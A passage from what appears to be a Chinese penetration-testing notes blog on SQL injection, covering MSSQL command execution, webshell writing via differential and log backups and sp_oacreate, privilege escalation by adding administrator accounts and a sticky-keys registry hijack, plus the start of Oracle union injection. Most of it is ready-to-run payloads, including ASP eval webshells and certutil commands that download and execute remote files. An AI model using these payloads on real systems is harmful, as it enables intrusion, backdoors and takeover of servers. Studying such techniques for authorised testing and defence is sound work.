<p>xp_cmdshell我们可以建立一个表，将我们的cmd查询结果写入表中，再查询表即可：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1;CREATE TABLE cmdtmp (dir varchar(8000));</span><br><span class="line"></span><br><span class="line">id=1;insert into cmdtmp(dir) exec master..xp_cmdshell &#x27;for /r c:\ %i in (1*.aspx) do @echo %i&#x27;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>\r</code>：递归搜索</p>
</blockquote>
<p>SQL Server 阻止了对组件 <code>xp_cmdshell</code> 的过程 <code>sys.xp_cmdshell</code> 的访问，因为此组件已作为此服务器安全配置的一部分而被<strong>关闭</strong>。如果xp_cmdshell不能调用，可通过使用<strong>sp_configgure启用（需要sysadmin权限）</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 允许修改高级参数 </span><br><span class="line">;EXEC sp_configure &#x27;show advanced options&#x27;,1;RECONFIGURE;</span><br><span class="line"></span><br><span class="line">// 打开xp_cmdshell 扩展</span><br><span class="line">;EXEC sp_configure &#x27;xp_cmdshell&#x27;,1;RECONFIGURE;--</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="备份写shell"><a href="#备份写shell" class="headerlink" title="备份写shell"></a>备份写shell</h5><h6 id="差异备份写shell"><a href="#差异备份写shell" class="headerlink" title="差异备份写shell"></a>差异备份写shell</h6><p>条件：</p>
<ul>
<li><p><strong>至少DBO权限</strong></p>
</li>
<li><p><strong>前提知道绝对路径，路径可写。</strong></p>
</li>
<li><p><strong>HTTP 500错误不是自定义</strong></p>
</li>
<li><p><strong>WEB和数据在一块。还有的就是数据库中不能存在%号之类的，不然也是不成功的。</strong></p>
</li>
<li><p><strong>数据量不能太大</strong></p>
</li>
</ul>
<p>流程：</p>
<ul>
<li><p><strong>手动完整备份文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;backup database 库名 to disk = &#x27;c:\bak.bak&#x27; ;--</span><br></pre></td></tr></table></figure>

<blockquote>
<p>to disk：指定备份的目标位置为磁盘。</p>
<p>‘c:\bak.bak’：备份文件的完整路径和文件名。</p>
</blockquote>
<p>如果<strong>过滤了特殊的字符比如单引号</strong>，可以用<strong>定义局部变量来执行</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;declare @a sysname,@s varchar(4000) select @a=db_name(),@s=0x备份路径\xx.bak backup database @a to disk=@s--     </span><br><span class="line">//0x备份的数据库名转换成16位进制,db_name()里面可以加数字备份不同的数据库</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>创建恶意表并插入shell</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;create table 数据库名..表名(a image)--</span><br><span class="line"></span><br><span class="line">;insert into 数据库名..表名(a) values (0x3C25657865637574652872657175657374282261222929253E)--</span><br><span class="line">//&lt;%execute(request(&quot;a&quot;))%&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>差异备份到asp文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;backup database 库名 to disk = &#x27;c:\shell.asp&#x27; with differential , format ;--</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>WITH DIFFERENTIAL</code>：表示差异备份，仅备份自上次完整备份后的变化。</p>
<p><code>WITH FORMAT</code>：覆盖现有备份文件，确保写入成功。</p>
</blockquote>
<p>此时会将完整备份 <code>C:\bak.bak</code>所有的变更(新创建的 <code>test</code> 表和插入的恶意数据)都写入到<code>c:\shell.asp</code>文件中</p>
<p>如果<strong>过滤了特殊的字符比如单引号</strong>，可以用<strong>定义局部变量来执行</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;declare @a sysname,@s varchar(4000) select @a=db_name(),@s=0x备份路径\xx.asp backup database @a to disk=@s WITH DIFFERENTIAL,FORMAT--     </span><br><span class="line">//备份到路径\xx.asp，前提是已得知路径，注意转换为16进制,假如备份的路径为c:\webroot\shell.asp </span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>备份完getshell后删除表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;Drop table 数据库..表名--</span><br></pre></td></tr></table></figure></li>
</ul>
<p>差异备份有多种情况可能不成功，一般就是目录权限的问题，一般不要直接备份到 c 盘根目录</p>
<h6 id="LOG备份"><a href="#LOG备份" class="headerlink" title="LOG备份"></a>LOG备份</h6><p>前提：</p>
<ul>
<li><p><strong>至少DBO权限</strong></p>
</li>
<li><p><strong>前提得知绝对路径，并且可写</strong></p>
</li>
<li><p><strong>站库不分离</strong></p>
</li>
<li><p><strong>数据库必须被备份过一次</strong></p>
</li>
</ul>
<p>原理就是通过<strong>导出日志文件到web路径来getshell</strong></p>
<p>LOG备份的好处就是备份出来的webshell的<strong>文件大小非常的小</strong></p>
<p>流程：</p>
<ul>
<li><p><strong>数据库启用完整恢复模式</strong></p>
<p>数据库启用完整恢复功能后，会记录所有事务日志</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;alter database 库名 set RECOVERY FULL--</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>创建恶意表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;create table 数据库名..表名(a image)--</span><br></pre></td></tr></table></figure>

<blockquote>
<p>image类型用于存储二进制数据（如文本、脚本）</p>
</blockquote>
</li>
<li><p><strong>事务日志备份</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;backup log 库名 to disk=&#x27;c:\xxx&#x27; with init</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>with init</code>：覆盖现有备份日志，创建一个新的日志链起点</p>
</blockquote>
</li>
<li><p><strong>插入shell</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;insert into 数据库名..表名 (a) values (0x3C25657865637574652872657175657374282261222929253E)</span><br><span class="line">//&lt;%execute(request(&quot;a&quot;))%&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>再次备份事务日志，生成恶意文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;backup log 库名 to disk = &#x27;c:\xxx\2.asp&#x27;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>会包含第一次备份以来的新事务日志，即插入shell的操作</p>
</blockquote>
</li>
<li><p><strong>删除表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;Drop table 数据库名..表名--</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="存储过程写shell"><a href="#存储过程写shell" class="headerlink" title="存储过程写shell"></a>存储过程写shell</h5><p>前提：</p>
<ul>
<li><strong>拥有DBA权限</strong></li>
<li><strong>知道的网站绝对路径</strong></li>
</ul>
<p>扩展存储过程：是mssql提供的特殊功能，本质上就是一个普通的Windows系统DLL文件，按照某种规则实现了某些函数功能。</p>
<p>常用的扩展存储功能：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell—利用此存储过程可以直接执行系统命令。</span><br><span class="line">xp_regread—利用此存储过程可以进行注册表读取。</span><br><span class="line">xp_regwrit一利用此存储过程可以写入注册表。</span><br><span class="line">xp_dirtre一利用此存储过程可以进行列目录操作。</span><br><span class="line">xp_enumds—利用此存储过程可以进行ODBC连接。</span><br><span class="line">xp_loginconfig-利用此存储过程可以配置服务器安全模式信息。</span><br><span class="line">xp_makecab一一利用此存储过程可以创建压缩卷。</span><br><span class="line">xp_ntsec_enumdomains-利用此存储过程可以查看domain信息。</span><br><span class="line">xp_terminate_jroces一利用此存储过程可以查看终端进程，给出一个进程PID.</span><br><span class="line">sp_oacreate-SQL Server 中的 OLE 自动化存储过程，用于创建COM对象实例</span><br><span class="line">sp_oamethod-SQL Server 中的 OLE 自动化存储过程，调用已创建的 COM 对象的方法。</span><br></pre></td></tr></table></figure>

<h6 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h6><p>xp_cmdshell利用（一般都是sqlmap执行–os-shell后)：</p>
<ul>
<li><p><strong>开启xp_cmdshell</strong></p>
<p>在 SQL Server 2005以后默认关闭，需要利用sp_configure手动开启（需要sysadmin权限）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#开启高级选项</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line"># 配置生效</span><br><span class="line">RECONFIGURE;</span><br><span class="line"># 开启xp_cmdshell，配置生效</span><br><span class="line">exec sp_configure&#x27;xp_cmdshell&#x27;, 1;RECONFIGURE;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>echo写shell</strong></p>
<p>前提是知道<strong>web目录的绝对路径</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1;exec master..xp_cmdshell &#x27;echo ^&lt;%@ Page Language=&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.Item[&quot;cmd&quot;],&quot;unsafe&quot;);%^&gt; &gt; c:\\WWW\\404.aspx&#x27; ;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>^</code>是转义字符用于转义<code>&lt;&gt;</code></p>
</blockquote>
<p>当<strong>路径为中文时不建议echo写马</strong></p>
<p><strong>一般利用sqlmap <code>--file-write</code>写bat文件getshell</strong></p>
<p>但注意mssql一般使用<strong>gb2312编码</strong>，而sqlmap <strong>echo写马使用utf-8编码</strong>，为了写马，常常需要在对方文件写一个bat执行文件，而asp的木马中 % 文件跟bat不兼容，所以我们手工写的需要将sqlmap代理到burp，抓包<strong>修改utf-8编码的hex改为gb2312编码的hex值</strong></p>
<p>或者使用远程下载免杀🐎：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=3;exec master..xp_cmdshell &quot;certutil -urlcache -split -f http://test1.com/shell.aspx  d:\test\shell.aspx&quot; --</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Certutil是Windows系统中的一个命令行工具，在渗透测试中常用来下载文件、编码解码数据</p>
<p><code>-urlcache</code>：启用 URL 缓存。</p>
<p><code>-split</code>：分割输出。</p>
<p><code>-f</code>：强制覆盖现有文件。</p>
</blockquote>
</li>
</ul>
<h6 id="sp-oacreate"><a href="#sp-oacreate" class="headerlink" title="sp_oacreate"></a>sp_oacreate</h6><p><code>sp_oacreate</code>：SQL Server 中的 OLE 自动化存储过程，用于<strong>创建COM对象实例</strong><br><code>sp_oamethod</code>：SQL Server 中的 OLE 自动化存储过程，调用<strong>已创建的 COM 对象的方法</strong></p>
<p>语法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DECLARE @object_id INT;</span><br><span class="line">EXEC sp_oacreate &#x27;COM组件名称&#x27;, @object_id OUTPUT;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_oamethod @object_id, &#x27;方法名&#x27;, [返回变量], 参数1, 参数2, ...;</span><br></pre></td></tr></table></figure>

<p>利用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-- 首先判断当前是否为DBA权限，为1则可以提权</span><br><span class="line">select is_srvrolemember(&#x27;sysadmin&#x27;);</span><br><span class="line"></span><br><span class="line">-- 利用存储过程写入一句话,注意路径</span><br><span class="line">declare @o int, @f int, @t int, @ret int</span><br><span class="line">exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o out</span><br><span class="line">exec sp_oamethod @o, &#x27;createtextfile&#x27;, @f out, &#x27;C:\www\test.asp&#x27;, 1</span><br><span class="line">exec @ret = sp_oamethod @f, &#x27;writeline&#x27;, NULL,&#x27;&lt;%execute(request(&quot;a&quot;))%&gt;&#x27;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>创建文件系统对象<code>scripting.filesystemobject</code>，并调用其<code>createtextfile</code>方法创建test.asp文件，同时将创建的文件对象引用存储在变量 <code>@f</code> 中。最后通过writeline将shell写入文件中</p>
</blockquote>
<h4 id="mssql提权"><a href="#mssql提权" class="headerlink" title="mssql提权"></a>mssql提权</h4><h5 id="xp-cmdshell-1"><a href="#xp-cmdshell-1" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h5><p>测试xp_cmdshell是否可执行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#x27;ver&#x27;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>执行会显示当前操作系统的版本信息。</p>
</blockquote>
<p><strong>添加管理员用户</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#创建一个用户q添加到本地组组</span><br><span class="line">exec master.dbo.xp_cmdshell &#x27;net user q 123456q /add&#x27;</span><br><span class="line">#将本地组q添加管理员组</span><br><span class="line">exec master.dbo.xp_cmdshell &#x27;net localgroup administrators q /add&#x27;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>&#x2F;add是一个参数，表示执行添加用户的操作</p>
<p><code>net user</code>：管理用户账户</p>
<p><code>net localgroup</code>：管理本地组</p>
</blockquote>
<p><strong>下载执行恶意程序</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.xp_cmdshell &#x27;cd c:\www &amp; certutil -urlcache -split -f http://192.168.130.142:80/download/file.exe&#x27;;</span><br><span class="line"></span><br><span class="line">exec master.dbo.xp_cmdshell &#x27;cd c:\www &amp; file.exe&#x27;;</span><br></pre></td></tr></table></figure>

<h5 id="sp-oacreate-1"><a href="#sp-oacreate-1" class="headerlink" title="sp_oacreate"></a>sp_oacreate</h5><p><strong>sp_oacreate</strong> 是一个非常危险的存储过程可以<strong>删除、复制、移动文件</strong>。还能配合 <strong>sp_oamethod</strong> 来写文件执行 cmd。</p>
<p>当xp_cmdshell被删除可以使用sp_oacreate来提权</p>
<p><strong>恢复sp_oacreate</strong>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 开启sp_oacreate</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;</span><br><span class="line">exec sp_configure &#x27;ole automation procedures&#x27;,1;reconfigure;</span><br><span class="line"></span><br><span class="line"># 关闭sp_oacreate</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;</span><br><span class="line">exec sp_configure &#x27;ole automation procedures&#x27;,0;reconfigure;</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;,0;reconfigure;</span><br><span class="line"></span><br><span class="line"># 查看 sp_oacreate 状态</span><br><span class="line">exec sp_configure;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>ole automation procedures</code>：OLE 自动化过程，允许 SQL Server 可以通过 OLE 自动化接口与外部应用程序进行交互。</p>
</blockquote>
<p><strong>执行cmd:</strong></p>
<p><code>wscript.shell</code>：是 Windows Script Host (WSH) 中的一个 COM 对象，它提供了与 Windows 操作系统进行交互的功能，通常用于<strong>执行系统命令、运行程序、设置环境变量</strong>等。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">declare @shell int</span><br><span class="line">exec sp_oacreate &#x27;wscript.shell&#x27;, @shell output</span><br><span class="line">exec sp_oamethod @shell, &#x27;run&#x27;, null, &#x27;c:\windows\system32\cmd.exe /c xxx&#x27;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>&#x2F;c表示<code>cmd.exe</code> 执行完命令后关闭命令行窗口。xxx指任意命令或脚本。</p>
</blockquote>
<p><code>Shell.Application</code>：是另一个 Windows Shell COM 对象，它能提供了比 <code>WScript.Shell</code> 更多的功能，尤其是与 Windows Shell 进行交互的功能。通过 <code>Shell.Application</code>同样可以<strong>执行文件、显示文件夹、启动进程</strong>等。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">declare @o int</span><br><span class="line">exec sp_oacreate &#x27;Shell.Application&#x27;, @o out</span><br><span class="line">exec sp_oamethod @o, &#x27;ShellExecute&#x27;, null, &#x27;cmd.exe&#x27;, &#x27;cmd /c net user &gt;c:\test.txt&#x27;, &#x27;c:\windows\system32&#x27;, &#x27;&#x27;, &#x27;1&#x27;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>&#39;cmd /c net user &gt; c:\test.txt&#39;</code>：会执行 <code>net user</code> 命令（列出所有用户），并将输出重定向到 <code>c:\test.txt</code> 文件中。</p>
<p><code>&#39;c:\windows\system32&#39;</code>：执行命令时的工作目录</p>
</blockquote>
<p><strong>提权：</strong></p>
<p>一样的，只用把执行的命令换成提权的命令就行了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">declare @o INT</span><br><span class="line">exec sp_oacreate &#x27;wscript.shell&#x27;,@o output</span><br><span class="line">exec sp_oamethod @o,&#x27;run&#x27;,null,&#x27;net user hack hack /add&#x27;,&#x27;0&#x27;,&#x27;true&#x27;;</span><br><span class="line">exec sp_oamethod @o,&#x27;run&#x27;,null,&#x27;net localgroup administrators hack /add&#x27;,&#x27;0&#x27;,&#x27;true&#x27;;</span><br></pre></td></tr></table></figure>

<p><code>Shell.Application</code>方法一样</p>
<h5 id="沙盒提权"><a href="#沙盒提权" class="headerlink" title="沙盒提权"></a>沙盒提权</h5><p><strong>沙盒模式</strong>是数据库的一种安全功能。在沙盒模式下，只对控件和字段属性中的安全且不含恶意代码的表达式求值。如果表达式不使用可能以某种方式损坏数据的函数或属性，则可认为它是安全的。</p>
<p>利用前提：</p>
<ul>
<li><code>xp_regwrite</code> 可用(使用条件)</li>
<li>拥有 DBA 权限</li>
<li>服务器拥有 jet.oledb.4.0 驱动</li>
</ul>
<p>原理就是对注册表的操作，依赖<strong>xp_regwrite</strong>存储过程对注册表修改，且<strong>服务器拥有 jet.oledb.4.0 驱动。</strong></p>
<p><strong>开启沙盒模式</strong>：</p>
<p>注册表中沙盒模式的位置在：<code>HKEY_LOCAL_MACHINE\Software\Microsoft\Jet\4.0\Engine\SandBoxMode</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#win2003</span><br><span class="line">exec master..xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,1</span><br></pre></td></tr></table></figure>

<blockquote>
<p>修改注册表中Jet 4.0引擎的SandBoxMode值为1</p>
</blockquote>
<p><strong>SandBoxMode参数含义（默认为2）</strong>：</p>
<ul>
<li><code>0</code>：在任何所有者中禁止启用安全模式</li>
<li><code>1</code> ：为仅在允许范围内</li>
<li><code>2</code> ：必须在access模式下</li>
<li><code>3</code>：完全开启</li>
</ul>
<p><strong>利用 jet.oledb 执行系统命令添加用户:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27; ,&#x27;;database=c:\windows\system32\ias\ias.mdb&#x27; ,&#x27;select shell(&quot;cmd.exe /c net user q 123456q /add&quot;)&#x27;)</span><br></pre></td></tr></table></figure>

<p><strong>将 q 用户添加至管理员组:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27; ,&#x27;;database=c:\windows\system32\ias\ias.mdb&#x27; ,&#x27;select shell(&quot;cmd.exe /c net localgroup administrators q /add&quot;)&#x27;)</span><br></pre></td></tr></table></figure>

<h5 id="利用映像劫持提权"><a href="#利用映像劫持提权" class="headerlink" title="利用映像劫持提权"></a>利用映像劫持提权</h5><p>原理就是利用xp_regwrite函数修改注册表，起到劫持作用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Image File Execution</span><br><span class="line">Options\sethc.EXE&#x27;,&#x27;Debugger&#x27;,&#x27;REG_SZ&#x27;,&#x27;c:\windows\system32\cmd.exe&#x27;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>sethc.exe</code> 是 Windows 系统中的 “Sticky Keys” (粘滞键) 实用程序，它通常是通过按下 Shift 键五次启动的，用于帮助那些有肢体障碍的用户。</p>
</blockquote>
<p>当按下 Shift 键五次后系统会以<code>SYSTEM</code>权限运行<code>cmd.exe</code></p>
<h5 id="CLR提权"><a href="#CLR提权" class="headerlink" title="CLR提权"></a>CLR提权</h5><p>CLR（公共语言运行库）集成是 SQL Server2005 出现的新功能，它将 .NET Framework 中的 CLR 服务注入到 SQL Server 中，允许在数据库中执行 .NET 程序。攻击者可以利用 CLR 提供的能力编写恶意代码，执行操作系统命令。以后再研究吧</p>
<p>可以使用<strong>SharpSQLTools</strong>工具</p>
<h4 id="bypass-1"><a href="#bypass-1" class="headerlink" title="bypass"></a>bypass</h4><h5 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h5><ul>
<li><p>特殊字符<code>%C2%85(U+0085,控制字符(NEL))</code>、<code>%C2%A0(U+00A0,不换行空格)</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%C2%85union%C2%85select%C2%A0null,@@version,null--</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="oracle注入"><a href="#oracle注入" class="headerlink" title="oracle注入"></a>oracle注入</h3><h4 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h4><p><strong>特殊核心表</strong>：</p>
<p>dual：是一个虚拟表，用来构成select的语法规则，如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select null,null from dual</span><br></pre></td></tr></table></figure>

<p>能查询表信息的<strong>系统表</strong>：</p>
<p><code>dba_tables</code> : 系统里<strong>所有的表的信息</strong>，需要DBA权限才能查询</p>
<p><code>all_tables</code> : <strong>当前用户有权限的表的信息</strong>（只要对某个表有任何权限，即可在此视图中看到表的相关信息）</p>
<p><code>user_tables</code>: <strong>当前用户名下的表的信息</strong></p>
<p>（关键字段：table_name）</p>
<p>能查询列信息的<strong>系统表</strong>：</p>
<p><code>dba_tab_columns</code>：对应 <strong>dba_tables表 包含的所有表的列信息</strong></p>
<p><code>all_tab_columns</code>：对应 <strong>all_tables表 包含的所有表的列信息</strong></p>
<p><code>user_tab_columns</code>：对应 <strong>user_tables表 包含的所有表的列信息</strong></p>
<p> （关键字段：<code>table_name,column_name,data_type,data_length</code>）</p>
<p><strong>内置默认账号</strong>:</p>
<table>
<thead>
<tr>
<th><strong>用户名&#x2F;密码</strong></th>
<th><strong>登录身份</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td>sys&#x2F;change_on_install</td>
<td>SYSDBA 或 SYSOPER</td>
<td>不能以 NORMAL 登录，可作为默认的系统管理员</td>
</tr>
<tr>
<td>system&#x2F;manager</td>
<td>SYSDBA 或 NORMAL</td>
<td>不能以 SYSOPER 登录，可作为默认的系统管理员</td>
</tr>
<tr>
<td>sysman&#x2F;oem_temp</td>
<td>sysman</td>
<td>为 oms 的用户名</td>
</tr>
<tr>
<td>scott&#x2F;tiger</td>
<td>NORMAL</td>
<td>普通用户</td>
</tr>
<tr>
<td>aqadm&#x2F;aqadm</td>
<td>SYSDBA 或 NORMAL</td>
<td>高级队列管理员</td>
</tr>
<tr>
<td>dbsnmp&#x2F;dbsnmp</td>
<td>SYSDBA 或 NORMAL</td>
<td>复制管理员</td>
</tr>
</tbody></table>
<p><strong>oracle特点</strong>：</p>
<ul>
<li><p><strong>不支持堆叠查询</strong></p>
<p>可以尝试提交多语句支持符号 <code>;</code>，如果支持多行查询，说明是MSSQL或MySQL，不支持则是 Oracle</p>
</li>
<li><p>使用<strong>查询语句必须跟上表名</strong>，如果没有表则使用 <strong>dual 表</strong></p>
</li>
<li><p><strong>Oracle的数据类型是强匹配的</strong></p>
<p>在进行类似union查询数据时候必须让<strong>对应位置上的数据类型和表中的列的数据类型是一致的</strong>，也可以使用<strong>null代替某些无法快速猜测出数据类型的位置</strong>。</p>
</li>
<li><p><strong>没有limit语句</strong></p>
<p>一般使用 <code>where rownum=1</code> 语句代替</p>
</li>
<li><p><strong>有 user_tables 等其它类型数据库没有的表</strong></p>
</li>
<li><p><strong>当前数据库名就是当前用户名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select user from dual </span><br></pre></td></tr></table></figure>

<p>其实就是<strong>同时获取数据库名和用户名</strong></p>
</li>
<li><p><strong>可用的注释符</strong></p>
<p>单行注释<code>--</code> 和 多行注释<code>/**/</code>，只有MySQL才支持<code>#</code>注释符</p>
</li>
<li><p><strong>oracle没有if函数</strong></p>
<p>一般进行布尔盲注时一般使用<strong>decode()或者instr()函数，或者使用 case when语句</strong></p>
</li>
<li><p><strong>可通过<code>||</code>拼接字符</strong></p>
</li>
</ul>
<h4 id="注入姿势-2"><a href="#注入姿势-2" class="headerlink" title="注入姿势"></a>注入姿势</h4><h5 id="联合注入-1"><a href="#联合注入-1" class="headerlink" title="联合注入"></a>联合注入</h5><ul>
<li><p><strong>判断字段数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 4--+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>对每列数据类型进行判断</strong></p>
<p>有用Oracle是强比较，需要数据类型一致，我们可以默认每一列均为null，然后从第一列开始依次将<strong>null改为字符串，如果报错则说明该列是数字型</strong>，否则则是字符型。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select null,null from dual</span><br><span class="line"></span><br><span class="line">?id=-1 union select &#x27;null&#x27;,&#x27;null&#x27; from dual</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>信息获取</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#获取数据库信息</span><br><span class="line">?id=-1 union select &#x27;null&#x27;,(select banner from sys.v_$version where rownum=1) from dual</span><br><span class="line">#获取当前用户</span><br><span class="line">?id=-1 union select &#x27;1&#x27;,user from dual</span><br><span class="line">#获取当前环境</span><br><span class="line">?id=-1 union select &#x27;1&#x27;,(select SYS_CONTEXT (&#x27;USERENV&#x27;, &#x27;CURRENT_USER&#x27;) from dual) from dual</span><br></pre></td></tr></table></figure>

